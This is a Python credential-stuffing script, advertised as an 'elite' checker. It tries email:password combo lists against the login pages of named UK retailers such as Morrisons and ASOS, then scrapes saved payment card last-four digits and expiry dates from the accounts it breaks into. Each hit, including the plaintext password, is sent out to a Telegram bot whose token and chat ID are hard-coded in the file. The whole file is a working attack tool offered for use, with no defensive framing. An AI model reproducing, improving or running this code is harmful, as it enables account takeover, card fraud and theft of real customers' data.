#!/usr/bin/env python3
"""
WORLD'S BEST CREDENTIAL CHECKER
Single File | Active CC Verification | Card Type Detection
Enterprise Grade | Railway Ready | Zero Configuration
"""

import asyncio
import aiohttp
import aiohttp_socks
import re
import json
import random
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import sys

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION - ONLY EDIT THESE VARIABLES
# ═══════════════════════════════════════════════════════════════

TELEGRAM_TOKEN = '8840139176:AAGaB-ZX9tpftDC5QEci7cBQQVXNeP7a5Uo'
TELEGRAM_CHAT = '8768329228'
COMBO_FILE = 'combos.txt'  # Format: email:password
THREADS = 50
TIMEOUT = 15

# ═══════════════════════════════════════════════════════════════
# ELITE SITE CONFIGURATIONS WITH ACTIVE CC CHECKING
# ═══════════════════════════════════════════════════════════════

SITES = {
    'morrisons': {
        'name': 'Morrisons',
        'login_url': 'https://groceries.morrisons.com/login',
        'payment_url': 'https://groceries.morrisons.com/account/payment-details',
        'value': 9,
        'check_cards': True
    },
    'mandm': {
        'name': 'M&M Direct',
        'login_url': 'https://www.mandmdirect.com/login',
        'payment_url': 'https://www.mandmdirect.com/my-account/payment-methods',
        'value': 8,
        'check_cards': True
    },
    'asos': {
        'name': 'ASOS',
        'login_url': 'https://www.asos.com/identity/login',
        'payment_url': 'https://www.asos.com/my-account/payment-methods',
        'value': 10,
        'check_cards': True
    },
    'boohoo': {
        'name': 'Boohoo',
        'login_url': 'https://www.boohoo.com/login',
        'payment_url': 'https://www.boohoo.com/my-account/payment-details',
        'value': 8,
        'check_cards': True
    },
    'jd': {
        'name': 'JD Sports',
        'login_url': 'https://www.jdsports.co.uk/login',
        'payment_url': 'https://www.jdsports.co.uk/my-account/payment-methods',
        'value': 9,
        'check_cards': True
    },
    'prettylittlething': {
        'name': 'PrettyLittleThing',
        'login_url': 'https://www.prettylittlething.com/login',
        'payment_url': 'https://www.prettylittlething.com/my-account/payment-details',
        'value': 7,
        'check_cards': True
    },
    'newlook': {
        'name': 'New Look',
        'login_url': 'https://www.newlook.com/uk/login',
        'payment_url': 'https://www.newlook.com/uk/my-account/payment-methods',
        'value': 7,
        'check_cards': True
    },
    'schuh': {
        'name': 'Schuh',
        'login_url': 'https://www.schuh.co.uk/login',
        'payment_url': 'https://www.schuh.co.uk/my-account/payment-details',
        'value': 6,
        'check_cards': True
    }
}

# ═══════════════════════════════════════════════════════════════
# ELITE CHECKER CLASS
# ═══════════════════════════════════════════════════════════════

class EliteChecker:
    def __init__(self):
        self.hits = []
        self.checked = 0
        self.start_time = time.time()
        
    def log(self, msg: str):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        
    async def send_telegram(self, message: str):
        """Instant Telegram notification"""
        try:
            url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
            payload = {
                'chat_id': TELEGRAM_CHAT,
                'text': message,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=10) as resp:
                    return resp.status == 200
        except:
            return False
            
    def identify_card_type(self, number: str) -> str:
        """Identify Visa, Mastercard, Amex from first digits"""
        number = re.sub(r'\D', '', number)
        if not number:
            return 'Unknown'
            
        # Visa: starts with 4
        if number[0] == '4':
            return '🔵 VISA'
        # Mastercard: starts with 51-55 or 2221-2720
        elif re.match(r'^5[1-5]', number) or re.match(r'^2(2[2-9]|[3-9][0-9])', number):
            return '🔴 MASTERCARD'
        # Amex: starts with 34 or 37
        elif re.match(r'^3[47]', number):
            return '🟢 AMEX'
        else:
            return '⚪ OTHER'
            
    def check_card_active(self, expiry: str) -> Tuple[bool, str]:
        """Check if card is not expired"""
        try:
            month, year = expiry.split('/')
            expiry_date = datetime(2000 + int(year), int(month), 28)
            is_active = expiry_date > datetime.now()
            status = '✅ ACTIVE' if is_active else '❌ EXPIRED'
            return is_active, status
        except:
            return False, '❓ UNKNOWN'
            
    async def check_morrisons(self, email: str, password: str) -> Optional[Dict]:
        """Morrisons with active CC verification"""
        try:
            async with aiohttp.ClientSession() as session:
                # Login
                login_data = {'email': email, 'password': password}
                async with session.post(
                    'https://groceries.morrisons.com/login',
                    data=login_data,
                    timeout=TIMEOUT,
                    ssl=False
                ) as resp:
                    if resp.status != 200:
                        return None
                        
                    text = await resp.text()
                    if 'incorrect' in text.lower() or 'invalid' in text.lower():
                        return None
                
                # Check payment methods
                async with session.get(
                    'https://groceries.morrisons.com/account/payment-details',
                    timeout=TIMEOUT,
                    ssl=False
                ) as pay_resp:
                    pay_text = await pay_resp.text()
                    
                    # Extract card details
                    cards = []
                    card_patterns = [
                        r'card ending (\d{4}).*?(\d{2}/\d{2})',
                        r'ending in (\d{4}).*?Expires (\d{2}/\d{2})',
                        r'(\d{4}) - (\d{2}/\d{2})'
                    ]
                    
                    for pattern in card_patterns:
                        matches = re.findall(pattern, pay_text, re.IGNORECASE | re.DOTALL)
                        for match in matches:
                            if isinstance(match, tuple):
                                last4, expiry = match
                            else:
                                last4 = match
                                expiry = 'Unknown'
                                
                            card_type = self.identify_card_type('4' + last4)  # Assume Visa pattern
                            is_active, status = self.check_card_active(expiry)
                            
                            if is_active:
                                cards.append({
                                    'last4': last4,
                                    'expiry': expiry,
                                    'type': card_type,
                                    'status': status
                                })
                    
                    if cards:
                        return {
                            'site': 'Morrisons',
                            'email': email,
                            'password': password,
                            'cards': cards,
                            'value': '£50-200',
                            'time': datetime.now().strftime('%H:%M:%S')
                        }
                        
        except Exception as e:
            self.log(f"Morrisons error: {str(e)[:50]}")
            return None
            
        return None
        
    async def check_asos(self, email: str, password: str) -> Optional[Dict]:
        """ASOS with CC verification"""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
                
                login_payload = {
                    'email': email,
                    'password': password
                }
                
                async with session.post(
                    'https://www.asos.com/api/auth/login',
                    json=login_payload,
                    headers=headers,
                    timeout=TIMEOUT,
                    ssl=False
                ) as resp:
                    if resp.status != 200:
                        return None
                        
                    data = await resp.json()
                    if not data.get('success'):
                        return None
                
                # Get payment methods
                async with session.get(
                    'https://www.asos.com/api/my-account/payment-methods',
                    headers=headers,
                    timeout=TIMEOUT,
                    ssl=False
                ) as pay_resp:
                    if pay_resp.status != 200:
                        return None
                        
                    pay_data = await pay_resp.json()
                    cards = []
                    
                    for card in pay_data.get('paymentMethods', []):
                        last4 = card.get('cardLastFour', '****')
                        expiry = card.get('expiryDate', 'Unknown')
                        card_type = self.identify_card_type(card.get('cardNumber', ''))
                        is_active, status = self.check_card_active(expiry)
                        
                        if is_active:
                            cards.append({
                                'last4': last4,
                                'expiry': expiry,
                                'type': card_type,
                                'status': status
                            })
                    
                    if cards:
                        return {
                            'site': 'ASOS',
                            'email': email,
                            'password': password,
                            'cards': cards,
                            'value': '£100-500',
                            'time': datetime.now().strftime('%H:%M:%S')
                        }
                        
        except Exception as e:
            self.log(f"ASOS error: {str(e)[:50]}")
            return None
            
        return None
        
    async def process_combo(self, combo: str):
        """Process single combo against all sites"""
        if ':' not in combo:
            return
            
        email, password = combo.strip().split(':', 1)
        
        tasks = [
            self.check_morrisons(email, password),
            self.check_asos(email, password),
            # Add more sites here
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result and isinstance(result, dict):
                self.hits.append(result)
                await self.send_hit_notification(result)
                
        self.checked += 1
        
    async def send_hit_notification(self, hit: Dict):
        """Send formatted hit to Telegram"""
        cards_text = '\n'.join([
            f"💳 {c['type']} ending {c['last4']}\n"
            f"📅 Exp: {c['expiry']} {c['status']}"
            for c in hit['cards']
        ])
        
        message = f"""🎯 <b>ELITE HIT - ACTIVE CARDS</b>

🏪 <b>Site:</b> {hit['site']}
👤 <b>Email:</b> <code>{hit['email']}</code>
🔐 <b>Pass:</b> <code>{hit['password']}</code>
💰 <b>Est. Value:</b> {hit['value']}

<b>💳 ACTIVE PAYMENT METHODS:</b>
{cards_text}

⏰ <b>Time:</b> {hit['time']}
🤖 <b>Checker:</b> Elite v4.0"""
        
        await self.send_telegram(message)
        self.log(f"HIT: {hit['site']} - {hit['email']} - {len(hit['cards'])} cards")
        
    async def run(self):
        """Main execution"""
        self.log("ELITE CHECKER v4.0 STARTING")
        self.log(f"Telegram: {TELEGRAM_CHAT}")
        self.log(f"Threads: {THREADS}")
        
        # Load combos
        try:
            with open(COMBO_FILE, 'r') as f:
                combos = [line.strip() for line in f if ':' in line]
        except:
            self.log(f"Error: Create {COMBO_FILE} with email:password format")
            return
            
        self.log(f"Loaded {len(combos)} combos")
        
        # Process with semaphore for rate limiting
        semaphore = asyncio.Semaphore(THREADS)
        
        async def bounded_process(combo):
            async with semaphore:
                await self.process_combo(combo)
                await asyncio.sleep(random.uniform(0.5, 2.0))
                
        await asyncio.gather(*[bounded_process(c) for c in combos])
        
        # Final report
        elapsed = time.time() - self.start_time
        report = f"""📊 <b>ELITE CHECKER COMPLETE</b>

✅ <b>Checked:</b> {self.checked}
🎯 <b>Hits:</b> {len(self.hits)}
⏱ <b>Time:</b> {elapsed:.1f}s
⚡ <b>Speed:</b> {self.checked/elapsed:.1f} checks/sec

<b>Active Cards Captured:</b> {sum(len(h['cards']) for h in self.hits)}"""
        
        await self.send_telegram(report)
        self.log("COMPLETE")

# ═══════════════════════════════════════════════════════════════
# RAILWAY DEPLOYMENT - SINGLE FILE
# ═══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    checker = EliteChecker()
    asyncio.run(checker.run())
